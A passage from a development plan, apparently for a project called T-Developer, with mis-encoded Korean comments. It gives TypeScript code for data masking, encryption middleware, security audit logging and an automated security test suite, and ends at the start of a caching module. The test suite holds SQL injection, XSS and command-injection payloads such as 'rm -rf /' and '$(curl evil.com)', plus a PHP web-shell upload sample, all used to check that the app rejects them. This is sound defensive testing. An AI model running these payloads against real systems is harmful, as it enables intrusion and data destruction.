  static maskObject(obj: any, sensitiveFields: string[]): any {
    const masked = JSON.parse(JSON.stringify(obj));
    
    const maskField = (target: any, path: string) => {
      const keys = path.split('.');
      let current = target;
      
      for (let i = 0; i < keys.length - 1; i++) {
        if (current[keys[i]] === undefined) return;
        current = current[keys[i]];
      }
      
      const lastKey = keys[keys.length - 1];
      if (current[lastKey] !== undefined) {
        if (typeof current[lastKey] === 'string') {
          // í•„ë“œ íƒ€ì…ì— ë”°ë¥¸ ë§ˆìŠ¤í‚¹
          if (lastKey.toLowerCase().includes('email')) {
            current[lastKey] = this.maskEmail(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('phone')) {
            current[lastKey] = this.maskPhone(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('card')) {
            current[lastKey] = this.maskCreditCard(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('ssn')) {
            current[lastKey] = this.maskSSN(current[lastKey]);
          } else {
            // ì¼ë°˜ í…ìŠ¤íŠ¸ ë§ˆìŠ¤í‚¹
            current[lastKey] = '*'.repeat(current[lastKey].length);
          }
        }
      }
    };
    
    sensitiveFields.forEach(field => maskField(masked, field));
    
    return masked;
  }
}

// ì•”í˜¸í™” ë¯¸ë“¤ì›¨ì–´
export class EncryptionMiddleware {
  private static encryptionService = new EncryptionService();
  
  // ì‘ë‹µ ë°ì´í„° ì•”í˜¸í™”
  static encryptResponse(fieldsToEncrypt: string[]) {
    return async (req: Request, res: Response, next: NextFunction) => {
      const originalJson = res.json;
      
      res.json = async function(data: any) {
        if (fieldsToEncrypt.length > 0 && data) {
          const encrypted = await EncryptionMiddleware.encryptFields(
            data,
            fieldsToEncrypt,
            { userId: req.user?.id }
          );
          return originalJson.call(this, encrypted);
        }
        return originalJson.call(this, data);
      };
      
      next();
    };
  }
  
  // ìš”ì²­ ë°ì´í„° ë³µí˜¸í™”
  static decryptRequest(fieldsToDecrypt: string[]) {
    return async (req: Request, res: Response, next: NextFunction) => {
      if (fieldsToDecrypt.length > 0 && req.body) {
        try {
          req.body = await EncryptionMiddleware.decryptFields(
            req.body,
            fieldsToDecrypt,
            { userId: req.user?.id }
          );
        } catch (error) {
          return res.status(400).json({
            error: 'Failed to decrypt request data',
            code: 'DECRYPTION_ERROR'
          });
        }
      }
      next();
    };
  }
  
  private static async encryptFields(
    data: any,
    fields: string[],
    context?: Record<string, string>
  ): Promise<any> {
    const result = JSON.parse(JSON.stringify(data));
    
    for (const field of fields) {
      const value = this.getFieldValue(result, field);
      if (value && typeof value === 'string') {
        const encrypted = await this.encryptionService.encryptField(value, context);
        this.setFieldValue(result, field, encrypted);
      }
    }
    
    return result;
  }
  
  private static async decryptFields(
    data: any,
    fields: string[],
    context?: Record<string, string>
  ): Promise<any> {
    const result = JSON.parse(JSON.stringify(data));
    
    for (const field of fields) {
      const value = this.getFieldValue(result, field);
      if (value && typeof value === 'string') {
        const decrypted = await this.encryptionService.decryptField(value, context);
        this.setFieldValue(result, field, decrypted);
      }
    }
    
    return result;
  }
  
  private static getFieldValue(obj: any, path: string): any {
    const keys = path.split('.');
    let current = obj;
    
    for (const key of keys) {
      if (current[key] === undefined) return undefined;
      current = current[key];
    }
    
    return current;
  }
  
  private static setFieldValue(obj: any, path: string, value: any): void {
    const keys = path.split('.');
    let current = obj;
    
    for (let i = 0; i < keys.length - 1; i++) {
      if (current[keys[i]] === undefined) {
        current[keys[i]] = {};
      }
      current = current[keys[i]];
    }
    
    current[keys[keys.length - 1]] = value;
  }
}
```

### SubTask 0.10.4: ë³´ì•ˆ ê°ì‚¬ ë¡œê¹…
**ëª©í‘œ**: ëª¨ë“  ë³´ì•ˆ ì´ë²¤íŠ¸ ì¶”ì  ë° ê°ì‚¬

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/security/audit-logging.ts
import { CloudWatchLogsClient, PutLogEventsCommand } from '@aws-sdk/client-cloudwatch-logs';
import { DynamoDBDocumentClient, PutCommand } from '@aws-sdk/lib-dynamodb';
import crypto from 'crypto';

interface SecurityEvent {
  id: string;
  timestamp: Date;
  eventType: SecurityEventType;
  severity: 'low' | 'medium' | 'high' | 'critical';
  userId?: string;
  ipAddress?: string;
  userAgent?: string;
  resource?: string;
  action?: string;
  result: 'success' | 'failure';
  details?: Record<string, any>;
  stackTrace?: string;
}

enum SecurityEventType {
  // ì¸ì¦ ê´€ë ¨
  LOGIN_ATTEMPT = 'LOGIN_ATTEMPT',
  LOGIN_SUCCESS = 'LOGIN_SUCCESS',
  LOGIN_FAILURE = 'LOGIN_FAILURE',
  LOGOUT = 'LOGOUT',
  PASSWORD_CHANGE = 'PASSWORD_CHANGE',
  PASSWORD_RESET = 'PASSWORD_RESET',
  MFA_ENABLED = 'MFA_ENABLED',
  MFA_DISABLED = 'MFA_DISABLED',
  
  // ê¶Œí•œ ê´€ë ¨
  UNAUTHORIZED_ACCESS = 'UNAUTHORIZED_ACCESS',
  PERMISSION_DENIED = 'PERMISSION_DENIED',
  PRIVILEGE_ESCALATION = 'PRIVILEGE_ESCALATION',
  
  // API í‚¤ ê´€ë ¨
  API_KEY_CREATED = 'API_KEY_CREATED',
  API_KEY_REVOKED = 'API_KEY_REVOKED',
  API_KEY_ROTATION = 'API_KEY_ROTATION',
  INVALID_API_KEY = 'INVALID_API_KEY',
  
  // ë°ì´í„° ì ‘ê·¼
  SENSITIVE_DATA_ACCESS = 'SENSITIVE_DATA_ACCESS',
  DATA_EXPORT = 'DATA_EXPORT',
  DATA_DELETION = 'DATA_DELETION',
  
  // ë³´ì•ˆ ìœ„í˜‘
  SQL_INJECTION_ATTEMPT = 'SQL_INJECTION_ATTEMPT',
  XSS_ATTEMPT = 'XSS_ATTEMPT',
  RATE_LIMIT_EXCEEDED = 'RATE_LIMIT_EXCEEDED',
  SUSPICIOUS_ACTIVITY = 'SUSPICIOUS_ACTIVITY',
  BRUTE_FORCE_ATTEMPT = 'BRUTE_FORCE_ATTEMPT',
  
  // ì‹œìŠ¤í…œ ë³´ì•ˆ
  SECURITY_CONFIGURATION_CHANGE = 'SECURITY_CONFIGURATION_CHANGE',
  CERTIFICATE_EXPIRY_WARNING = 'CERTIFICATE_EXPIRY_WARNING',
  ENCRYPTION_KEY_ROTATION = 'ENCRYPTION_KEY_ROTATION'
}

export class SecurityAuditLogger {
  private cloudWatchClient: CloudWatchLogsClient;
  private dynamoClient: DynamoDBDocumentClient;
  private logGroupName: string;
  private logStreamName: string;
  private tableName: string;
  
  constructor(
    cloudWatchClient: CloudWatchLogsClient,
    dynamoClient: DynamoDBDocumentClient
  ) {
    this.cloudWatchClient = cloudWatchClient;
    this.dynamoClient = dynamoClient;
    this.logGroupName = '/aws/t-developer/security-audit';
    this.logStreamName = `security-${new Date().toISOString().split('T')[0]}`;
    this.tableName = 'T-Developer-SecurityAudit';
  }
  
  async logSecurityEvent(event: Omit<SecurityEvent, 'id' | 'timestamp'>): Promise<void> {
    const securityEvent: SecurityEvent = {
      ...event,
      id: this.generateEventId(),
      timestamp: new Date()
    };
    
    // ë³‘ë ¬ë¡œ ì—¬ëŸ¬ ì €ì¥ì†Œì— ê¸°ë¡
    await Promise.all([
      this.saveToCloudWatch(securityEvent),
      this.saveToDynamoDB(securityEvent),
      this.alertIfCritical(securityEvent)
    ]);
  }
  
  private generateEventId(): string {
    return `sec_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
  }
  
  private async saveToCloudWatch(event: SecurityEvent): Promise<void> {
    const logEvent = {
      timestamp: event.timestamp.getTime(),
      message: JSON.stringify({
        ...event,
        timestamp: event.timestamp.toISOString()
      })
    };
    
    try {
      await this.cloudWatchClient.send(new PutLogEventsCommand({
        logGroupName: this.logGroupName,
        logStreamName: this.logStreamName,
        logEvents: [logEvent]
      }));
    } catch (error) {
      console.error('Failed to save security event to CloudWatch:', error);
    }
  }
  
  private async saveToDynamoDB(event: SecurityEvent): Promise<void> {
    const ttl = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1ë…„ ë³´ê´€
    
    try {
      await this.dynamoClient.send(new PutCommand({
        TableName: this.tableName,
        Item: {
          ...event,
          timestamp: event.timestamp.toISOString(),
          ttl,
          yearMonth: event.timestamp.toISOString().substring(0, 7), // íŒŒí‹°ì…˜ í‚¤ ìµœì í™”
          searchableText: this.createSearchableText(event) // ê²€ìƒ‰ ìµœì í™”
        }
      }));
    } catch (error) {
      console.error('Failed to save security event to DynamoDB:', error);
    }
  }
  
  private createSearchableText(event: SecurityEvent): string {
    return [
      event.eventType,
      event.userId,
      event.ipAddress,
      event.resource,
      event.action,
      JSON.stringify(event.details)
    ].filter(Boolean).join(' ').toLowerCase();
  }
  
  private async alertIfCritical(event: SecurityEvent): Promise<void> {
    if (event.severity === 'critical' || this.isCriticalEvent(event.eventType)) {
      // AlertManagerë¥¼ í†µí•´ ì¦‰ì‹œ ì•Œë¦¼
      const { alertManager, alertTemplates } = await import('../monitoring/alerting');
      
      await alertManager.sendAlert({
        level: 'critical',
        type: 'security',
        title: `Security Alert: ${event.eventType}`,
        message: `Critical security event detected: ${event.eventType}`,
        metadata: {
          eventId: event.id,
          userId: event.userId,
          ipAddress: event.ipAddress,
          details: event.details
        }
      });
    }
  }
  
  private isCriticalEvent(eventType: SecurityEventType): boolean {
    const criticalEvents = [
      SecurityEventType.PRIVILEGE_ESCALATION,
      SecurityEventType.SQL_INJECTION_ATTEMPT,
      SecurityEventType.BRUTE_FORCE_ATTEMPT,
      SecurityEventType.SENSITIVE_DATA_ACCESS,
      SecurityEventType.DATA_DELETION
    ];
    
    return criticalEvents.includes(eventType);
  }
  
  // ê°ì‚¬ ë¡œê·¸ ì¡°íšŒ ë©”ì„œë“œë“¤
  async querySecurityEvents(params: {
    startTime: Date;
    endTime: Date;
    userId?: string;
    eventType?: SecurityEventType;
    severity?: string;
  }): Promise<SecurityEvent[]> {
    // DynamoDB ì¿¼ë¦¬ êµ¬í˜„
    // ì‹¤ì œ êµ¬í˜„ì€ GSIë¥¼ ì‚¬ìš©í•˜ì—¬ íš¨ìœ¨ì ì¸ ì¿¼ë¦¬ ìˆ˜í–‰
    return [];
  }
  
  async generateComplianceReport(params: {
    startDate: Date;
    endDate: Date;
    reportType: 'SOC2' | 'ISO27001' | 'GDPR' | 'HIPAA';
  }): Promise<Buffer> {
    // ì»´í”Œë¼ì´ì–¸ìŠ¤ ë³´ê³ ì„œ ìƒì„± ë¡œì§
    const events = await this.querySecurityEvents({
      startTime: params.startDate,
      endTime: params.endDate
    });
    
    // PDF ë˜ëŠ” CSV í˜•ì‹ìœ¼ë¡œ ë³´ê³ ì„œ ìƒì„±
    return Buffer.from('Compliance Report');
  }
}

// ë³´ì•ˆ ê°ì‚¬ ë¯¸ë“¤ì›¨ì–´
export function auditMiddleware(auditLogger: SecurityAuditLogger) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const startTime = Date.now();
    
    // ì‘ë‹µ ì™„ë£Œ ì‹œ ê°ì‚¬ ë¡œê·¸ ê¸°ë¡
    res.on('finish', async () => {
      const duration = Date.now() - startTime;
      
      // ë³´ì•ˆ ê´€ë ¨ ì—”ë“œí¬ì¸íŠ¸ë§Œ ë¡œê¹…
      if (shouldAuditEndpoint(req.path)) {
        await auditLogger.logSecurityEvent({
          eventType: getEventTypeFromEndpoint(req.path, req.method),
          severity: res.statusCode >= 400 ? 'medium' : 'low',
          userId: req.user?.id,
          ipAddress: req.ip,
          userAgent: req.headers['user-agent'],
          resource: req.path,
          action: req.method,
          result: res.statusCode < 400 ? 'success' : 'failure',
          details: {
            statusCode: res.statusCode,
            duration,
            requestId: req.id,
            body: sanitizeForLogging(req.body)
          }
        });
      }
      
      // ë³´ì•ˆ ìœ„í˜‘ ê°ì§€
      if (isSecurityThreat(req, res)) {
        await auditLogger.logSecurityEvent({
          eventType: detectThreatType(req, res),
          severity: 'high',
          userId: req.user?.id,
          ipAddress: req.ip,
          userAgent: req.headers['user-agent'],
          resource: req.path,
          action: req.method,
          result: 'failure',
          details: {
            threat: analyzeThreat(req, res)
          }
        });
      }
    });
    
    next();
  };
}

// í—¬í¼ í•¨ìˆ˜ë“¤
function shouldAuditEndpoint(path: string): boolean {
  const auditPaths = [
    '/api/auth',
    '/api/users',
    '/api/admin',
    '/api/billing',
    '/api/security'
  ];
  
  return auditPaths.some(p => path.startsWith(p));
}

function getEventTypeFromEndpoint(path: string, method: string): SecurityEventType {
  // ê²½ë¡œì™€ ë©”ì„œë“œ ê¸°ë°˜ìœ¼ë¡œ ì´ë²¤íŠ¸ íƒ€ì… ê²°ì •
  if (path.includes('/login') && method === 'POST') {
    return SecurityEventType.LOGIN_ATTEMPT;
  }
  if (path.includes('/logout')) {
    return SecurityEventType.LOGOUT;
  }
  if (path.includes('/api-keys') && method === 'POST') {
    return SecurityEventType.API_KEY_CREATED;
  }
  // ê¸°íƒ€ ë§¤í•‘...
  
  return SecurityEventType.SENSITIVE_DATA_ACCESS;
}

function isSecurityThreat(req: Request, res: Response): boolean {
  // 401, 403 ë°˜ë³µ ì‹œë„
  // SQL injection íŒ¨í„´ ê°ì§€
  // XSS ì‹œë„ ê°ì§€
  // Rate limit ì´ˆê³¼
  return res.statusCode === 403 || res.statusCode === 401;
}

function detectThreatType(req: Request, res: Response): SecurityEventType {
  if (res.statusCode === 429) {
    return SecurityEventType.RATE_LIMIT_EXCEEDED;
  }
  if (res.statusCode === 401) {
    return SecurityEventType.UNAUTHORIZED_ACCESS;
  }
  return SecurityEventType.SUSPICIOUS_ACTIVITY;
}

function analyzeThreat(req: Request, res: Response): any {
  return {
    method: req.method,
    path: req.path,
    statusCode: res.statusCode,
    headers: req.headers,
    query: req.query
  };
}

function sanitizeForLogging(data: any): any {
  // ë¯¼ê°í•œ ì •ë³´ ì œê±°
  const sanitized = { ...data };
  const sensitiveFields = ['password', 'token', 'apiKey', 'secret'];
  
  sensitiveFields.forEach(field => {
    if (sanitized[field]) {
      sanitized[field] = '[REDACTED]';
    }
  });
  
  return sanitized;
}
```

### SubTask 0.10.5: ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ìë™í™”
**ëª©í‘œ**: ìë™í™”ëœ ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ìŠ¤ìœ„íŠ¸ êµ¬ì¶•

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/tests/security/security-test-suite.ts
import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import supertest from 'supertest';
import { OWASP_ZAP_API } from '@zaproxy/nodejs';
import sqlmap from 'sqlmap-api';

// ë³´ì•ˆ í…ŒìŠ¤íŠ¸ í—¬í¼
class SecurityTestHelper {
  private app: any;
  private zapClient: any;
  
  constructor(app: any) {
    this.app = app;
    this.zapClient = new OWASP_ZAP_API({
      apiKey: process.env.ZAP_API_KEY,
      proxy: 'http://localhost:8080'
    });
  }
  
  // SQL Injection í…ŒìŠ¤íŠ¸
  async testSQLInjection(endpoint: string, params: Record<string, string>): Promise<void> {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "1' UNION SELECT NULL--",
      "' OR 1=1--",
      "admin'--",
      "' OR 'a'='a",
      "'; EXEC xp_cmdshell('dir');--"
    ];
    
    for (const [key, value] of Object.entries(params)) {
      for (const payload of sqlPayloads) {
        const testParams = { ...params, [key]: payload };
        const response = await supertest(this.app)
          .get(endpoint)
          .query(testParams);
        
        // SQL ì—ëŸ¬ ë©”ì‹œì§€ ë…¸ì¶œ í™•ì¸
        expect(response.text).not.toMatch(/SQL syntax/i);
        expect(response.text).not.toMatch(/mysql_/i);
        expect(response.text).not.toMatch(/ORA-\d+/i);
        expect(response.text).not.toMatch(/PostgreSQL/i);
        
        // ì •ìƒì ì¸ ì—ëŸ¬ ì‘ë‹µ í™•ì¸
        expect(response.status).toBeGreaterThanOrEqual(400);
        expect(response.status).toBeLessThan(500);
      }
    }
  }
  
  // XSS í…ŒìŠ¤íŠ¸
  async testXSS(endpoint: string, params: Record<string, string>): Promise<void> {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<input onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>'
    ];
    
    for (const [key, value] of Object.entries(params)) {
      for (const payload of xssPayloads) {
        const testParams = { ...params, [key]: payload };
        const response = await supertest(this.app)
          .post(endpoint)
          .send(testParams);
        
        // XSS í˜ì´ë¡œë“œê°€ ê·¸ëŒ€ë¡œ ë°˜í™˜ë˜ì§€ ì•ŠëŠ”ì§€ í™•ì¸
        expect(response.text).not.toContain(payload);
        expect(response.text).not.toMatch(/<script/i);
        expect(response.text).not.toMatch(/javascript:/i);
        expect(response.text).not.toMatch(/onerror=/i);
      }
    }
  }
  
  // CSRF í…ŒìŠ¤íŠ¸
  async testCSRF(endpoint: string): Promise<void> {
    // CSRF í† í° ì—†ì´ ìš”ì²­
    const response = await supertest(this.app)
      .post(endpoint)
      .send({ action: 'delete' });
    
    expect(response.status).toBe(403);
    expect(response.body.error).toMatch(/CSRF/i);
  }
  
  // ì¸ì¦ ìš°íšŒ í…ŒìŠ¤íŠ¸
  async testAuthBypass(protectedEndpoints: string[]): Promise<void> {
    for (const endpoint of protectedEndpoints) {
      // ì¸ì¦ í—¤ë” ì—†ì´ ìš”ì²­
      const response1 = await supertest(this.app).get(endpoint);
      expect(response1.status).toBe(401);
      
      // ì˜ëª»ëœ í† í°ìœ¼ë¡œ ìš”ì²­
      const response2 = await supertest(this.app)
        .get(endpoint)
        .set('Authorization', 'Bearer invalid-token');
      expect(response2.status).toBe(401);
      
      // ë§Œë£Œëœ í† í°ìœ¼ë¡œ ìš”ì²­
      const expiredToken = this.generateExpiredToken();
      const response3 = await supertest(this.app)
        .get(endpoint)
        .set('Authorization', `Bearer ${expiredToken}`);
      expect(response3.status).toBe(401);
    }
  }
  
  // Rate Limiting í…ŒìŠ¤íŠ¸
  async testRateLimiting(endpoint: string, limit: number): Promise<void> {
    const requests = [];
    
    // ì œí•œë³´ë‹¤ ë§ì€ ìš”ì²­ ë³´ë‚´ê¸°
    for (let i = 0; i < limit + 5; i++) {
      requests.push(
        supertest(this.app)
          .get(endpoint)
          .set('X-API-Key', 'test-key')
      );
    }
    
    const responses = await Promise.all(requests);
    
    // ì œí•œ ì´ˆê³¼ ì‘ë‹µ í™•ì¸
    const rateLimitedResponses = responses.filter(r => r.status === 429);
    expect(rateLimitedResponses.length).toBeGreaterThan(0);
    
    // Rate limit í—¤ë” í™•ì¸
    const lastResponse = responses[responses.length - 1];
    expect(lastResponse.headers['x-ratelimit-limit']).toBeDefined();
    expect(lastResponse.headers['x-ratelimit-remaining']).toBeDefined();
    expect(lastResponse.headers['x-ratelimit-reset']).toBeDefined();
  }
  
  // ë³´ì•ˆ í—¤ë” í…ŒìŠ¤íŠ¸
  async testSecurityHeaders(endpoint: string): Promise<void> {
    const response = await supertest(this.app).get(endpoint);
    
    // í•„ìˆ˜ ë³´ì•ˆ í—¤ë” í™•ì¸
    expect(response.headers['x-content-type-options']).toBe('nosniff');
    expect(response.headers['x-frame-options']).toBe('DENY');
    expect(response.headers['x-xss-protection']).toBe('1; mode=block');
    expect(response.headers['strict-transport-security']).toMatch(/max-age=\d+/);
    expect(response.headers['content-security-policy']).toBeDefined();
    
    // ë¯¼ê°í•œ í—¤ë”ê°€ ë…¸ì¶œë˜ì§€ ì•ŠëŠ”ì§€ í™•ì¸
    expect(response.headers['x-powered-by']).toBeUndefined();
    expect(response.headers['server']).not.toMatch(/version/i);
  }
  
  private generateExpiredToken(): string {
    // ë§Œë£Œëœ JWT í† í° ìƒì„±
    return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.4Adcj3UFYzPUVaVF43FmMab6RlaQD8A9V8wFzzht-KQ';
  }
}

// ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ìŠ¤ìœ„íŠ¸
describe('Security Test Suite', () => {
  let app: any;
  let securityTester: SecurityTestHelper;
  
  beforeAll(async () => {
    // í…ŒìŠ¤íŠ¸ ì•± ì´ˆê¸°í™”
    app = await createTestApp();
    securityTester = new SecurityTestHelper(app);
  });
  
  afterAll(async () => {
    // ì •ë¦¬
    await cleanupTestApp();
  });
  
  describe('Injection Attacks', () => {
    test('should prevent SQL injection attacks', async () => {
      await securityTester.testSQLInjection('/api/projects', {
        search: 'test',
        sort: 'name'
      });
    });
    
    test('should prevent NoSQL injection attacks', async () => {
      const payload = { '$ne': null };
      const response = await supertest(app)
        .post('/api/projects/search')
        .send({ filter: payload });
      
      expect(response.status).toBe(400);
    });
    
    test('should prevent command injection', async () => {
      const payloads = [
        '; ls -la',
        '| whoami',
        '`rm -rf /`',
        '$(curl evil.com)'
      ];
      
      for (const payload of payloads) {
        const response = await supertest(app)
          .post('/api/execute')
          .send({ command: payload });
        
        expect(response.status).toBe(400);
      }
    });
  });
  
  describe('XSS Prevention', () => {
    test('should prevent reflected XSS', async () => {
      await securityTester.testXSS('/api/projects', {
        name: 'Test Project',
        description: 'Test Description'
      });
    });
    
    test('should prevent stored XSS', async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      
      // ì €ì¥ ì‹œë„
      const createResponse = await supertest(app)
        .post('/api/projects')
        .send({
          name: xssPayload,
          description: xssPayload
        });
      
      if (createResponse.status === 201) {
        // ì¡°íšŒí•˜ì—¬ XSS í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ”ì§€ í™•ì¸
        const getResponse = await supertest(app)
          .get(`/api/projects/${createResponse.body.id}`);
        
        expect(getResponse.text).not.toContain('<script>');
        expect(getResponse.headers['content-type']).toMatch(/json/);
      }
    });
  });
  
  describe('Authentication & Authorization', () => {
    test('should prevent authentication bypass', async () => {
      const protectedEndpoints = [
        '/api/admin/users',
        '/api/billing/invoices',
        '/api/projects/private'
      ];
      
      await securityTester.testAuthBypass(protectedEndpoints);
    });
    
    test('should prevent privilege escalation', async () => {
      const userToken = await getTestUserToken('user');
      
      // ì¼ë°˜ ì‚¬ìš©ìê°€ ê´€ë¦¬ì ì—”ë“œí¬ì¸íŠ¸ ì ‘ê·¼ ì‹œë„
      const response = await supertest(app)
        .get('/api/admin/settings')
        .set('Authorization', `Bearer ${userToken}`);
      
      expect(response.status).toBe(403);
    });
    
    test('should prevent JWT token manipulation', async () => {
      const validToken = await getTestUserToken('user');
      
      // í† í° í˜ì´ë¡œë“œ ë³€ì¡°
      const parts = validToken.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      payload.role = 'admin';
      parts[1] = Buffer.from(JSON.stringify(payload)).toString('base64');
      const manipulatedToken = parts.join('.');
      
      const response = await supertest(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${manipulatedToken}`);
      
      expect(response.status).toBe(401);
    });
  });
  
  describe('API Security', () => {
    test('should enforce rate limiting', async () => {
      await securityTester.testRateLimiting('/api/public/search', 100);
    });
    
    test('should validate API key format', async () => {
      const invalidKeys = [
        'invalid-key',
        'sk_',
        'sk_short',
        'not_starting_with_sk_validlength1234567890'
      ];
      
      for (const key of invalidKeys) {
        const response = await supertest(app)
          .get('/api/projects')
          .set('X-API-Key', key);
        
        expect(response.status).toBe(401);
        expect(response.body.code).toBe('INVALID_API_KEY_FORMAT');
      }
    });
    
    test('should enforce CORS policy', async () => {
      const response = await supertest(app)
        .options('/api/projects')
        .set('Origin', 'https://evil.com');
      
      expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com');
    });
  });
  
  describe('Security Headers', () => {
    test('should set all required security headers', async () => {
      await securityTester.testSecurityHeaders('/api/health');
    });
    
    test('should not expose sensitive information in errors', async () => {
      const response = await supertest(app)
        .get('/api/this-endpoint-does-not-exist');
      
      expect(response.status).toBe(404);
      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('sql');
      expect(response.body).not.toHaveProperty('database');
    });
  });
  
  describe('Data Protection', () => {
    test('should mask sensitive data in responses', async () => {
      const response = await supertest(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      if (response.status === 200) {
        // ì´ë©”ì¼ì´ ë§ˆìŠ¤í‚¹ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸
        expect(response.body.email).toMatch(/^.+\*+.+@.+$/);
        
        // ì „í™”ë²ˆí˜¸ê°€ ë§ˆìŠ¤í‚¹ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸
        if (response.body.phone) {
          expect(response.body.phone).toMatch(/\*+\d{4}$/);
        }
      }
    });
    
    test('should encrypt sensitive fields in database', async () => {
      // ì´ í…ŒìŠ¤íŠ¸ëŠ” ì‹¤ì œ DB ë ˆì½”ë“œë¥¼ í™•ì¸í•´ì•¼ í•¨
      // êµ¬í˜„ì€ í…ŒìŠ¤íŠ¸ í™˜ê²½ì— ë”°ë¼ ë‹¤ë¦„
    });
  });
  
  describe('File Upload Security', () => {
    test('should validate file types', async () => {
      const maliciousFile = Buffer.from('<?php system($_GET["cmd"]); ?>');
      
      const response = await supertest(app)
        .post('/api/upload')
        .attach('file', maliciousFile, 'shell.php')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/Invalid file type/i);
    });
    
    test('should enforce file size limits', async () => {
      const largeFile = Buffer.alloc(11 * 1024 * 1024); // 11MB
      
      const response = await supertest(app)
        .post('/api/upload')
        .attach('file', largeFile, 'large.jpg')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/File too large/i);
    });
  });
});

// ìë™í™”ëœ ë³´ì•ˆ ìŠ¤ìº” ì‹¤í–‰ ìŠ¤í¬ë¦½íŠ¸
export async function runSecurityScan(targetUrl: string): Promise<void> {
  console.log('ğŸ”’ Starting automated security scan...');
  
  // OWASP ZAP ìŠ¤ìº”
  const zap = new OWASP_ZAP_API({
    apiKey: process.env.ZAP_API_KEY,
    proxy: 'http://localhost:8080'
  });
  
  // ìŠ¤íŒŒì´ë” ì‹¤í–‰
  await zap.spider.scan(targetUrl);
  await waitForSpiderComplete(zap);
  
  // ì•¡í‹°ë¸Œ ìŠ¤ìº” ì‹¤í–‰
  await zap.ascan.scan(targetUrl);
  await waitForScanComplete(zap);
  
  // ê²°ê³¼ ê°€ì ¸ì˜¤ê¸°
  const alerts = await zap.core.alerts(targetUrl);
  
  // ë³´ê³ ì„œ ìƒì„±
  const report = generateSecurityReport(alerts);
  await saveSecurityReport(report);
  
  console.log('âœ… Security scan completed!');
}

// í—¬í¼ í•¨ìˆ˜ë“¤
async function getTestUserToken(role: string): Promise<string> {
  // í…ŒìŠ¤íŠ¸ìš© JWT í† í° ìƒì„±
  return 'test-token';
}

async function createTestApp(): Promise<any> {
  // í…ŒìŠ¤íŠ¸ ì•± ìƒì„±
  return {};
}

async function cleanupTestApp(): Promise<void> {
  // í…ŒìŠ¤íŠ¸ ì •ë¦¬
}

function generateSecurityReport(alerts: any[]): any {
  // ë³´ì•ˆ ë³´ê³ ì„œ ìƒì„±
  return {
    summary: {
      high: alerts.filter(a => a.risk === 'High').length,
      medium: alerts.filter(a => a.risk === 'Medium').length,
      low: alerts.filter(a => a.risk === 'Low').length
    },
    alerts
  };
}

async function saveSecurityReport(report: any): Promise<void> {
  // ë³´ê³ ì„œ ì €ì¥
}

async function waitForSpiderComplete(zap: any): Promise<void> {
  // ìŠ¤íŒŒì´ë” ì™„ë£Œ ëŒ€ê¸°
}

async function waitForScanComplete(zap: any): Promise<void> {
  // ìŠ¤ìº” ì™„ë£Œ ëŒ€ê¸°
}
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- ë³´ì•ˆ ê´€ë ¨ í™˜ê²½ ë³€ìˆ˜ ì„¤ì • (KMS í‚¤ ID ë“±)
- API í‚¤ ìƒì„± ë° ê´€ë¦¬ ì •ì±… ìˆ˜ë¦½
- ë³´ì•ˆ ê°ì‚¬ ë¡œê·¸ ë³´ê´€ ì •ì±… ì„¤ì •
- ì •ê¸°ì ì¸ ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ì‹¤í–‰ ìŠ¤ì¼€ì¤„ ì„¤ì •

---

## Task 0.11: ì„±ëŠ¥ ìµœì í™” ê¸°ì´ˆ ì„¤ì •

### SubTask 0.11.1: ìºì‹± ì „ëµ êµ¬í˜„
**ëª©í‘œ**: ë‹¤ê³„ì¸µ ìºì‹± ì‹œìŠ¤í…œ êµ¬ì¶•

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/performance/caching.ts
import Redis from 'ioredis';
import { LRUCache } from 'lru-cache';
import crypto from 'crypto';
import { logger } from '../config/logger';

// ìºì‹œ í‚¤ ë„¤ì„ìŠ¤í˜ì´ìŠ¤
enum CacheNamespace {
  PROJECT = 'project',
  USER = 'user',
  COMPONENT = 'component',
  AGENT_RESULT = 'agent_result',
  API_RESPONSE = 'api_response',
  SESSION = 'session'
}

// ìºì‹œ TTL ì„¤ì • (ì´ˆ)
const CacheTTL = {
  [CacheNamespace.PROJECT]: 3600,        // 1ì‹œê°„
  [CacheNamespace.USER]: 1800,           // 30ë¶„
  [CacheNamespace.COMPONENT]: 86400,     // 24ì‹œê°„
  [CacheNamespace.AGENT_RESULT]: 7200,   // 2ì‹œê°„
  [CacheNamespace.API_RESPONSE]: 300,    // 5ë¶„
